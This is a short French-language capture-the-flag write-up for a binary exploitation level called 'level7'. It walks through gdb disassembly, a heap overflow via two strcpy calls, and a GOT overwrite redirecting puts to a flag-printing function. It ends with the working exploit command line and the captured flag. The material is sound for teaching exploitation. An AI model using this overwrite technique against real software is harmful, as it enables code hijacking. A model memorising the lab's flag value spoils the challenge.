   set disassembly-flavor intel


i functions : 

0x080484f4  m
0x08048521  main




   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>


    fd = fopen("/home/user/level8/.pass", "r");
    fgets(buffer, 68, fd);
    puts("~~")


    Le buffer contient donc notre flag, il suffit de remplacer l'appel à puts par l'appel à la fonction "m" qui printera le buffer:

    printf("%s - %d\n", buffer, (int)time(0)); 

    Donc à l'étape <+214>, il faut que nous appelions l'adresse de 'm' (0x080484f4) au lieu de celle de 'puts'(0x8048400)

    On a deux strcpy qui copient nos argv 1 et 2 =>

  		strcpy(str1, (char *)argv[1]);                                              
        strcpy(str2, (char *)argv[2]);    


        str1 retour malloc : 0x0804a008
        str2 retour malloc : 0x0804a028
   
    


run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" "BBBB"

La premiere copie notre argument à l'adresse 0x0x804a008


Avant le second strcpy, on remarque que la destination est "0x37614136" (offset 20). C'est à cette adresse que nous allons copier notre argv[2]


(gdb) x/10wx 0x0804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41306141      0x61413161      0x33614132      0x41346141
0x804a028:      0x61413561      0x37614136  <= ICI


=> "'A'*20 + adresse destination" "adresse de m"


L'adresse de destination est celle de puts dans la table GOT
objdump -R level7
=> 08049928 R_386_JUMP_SLOT   puts

./level7 $(python -c "print ('A'*20 + '\x08\x04\x99\x28'[::-1])") $(python -c "print ('\x08\x04\x84\xf4'[::-1])")

flag : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9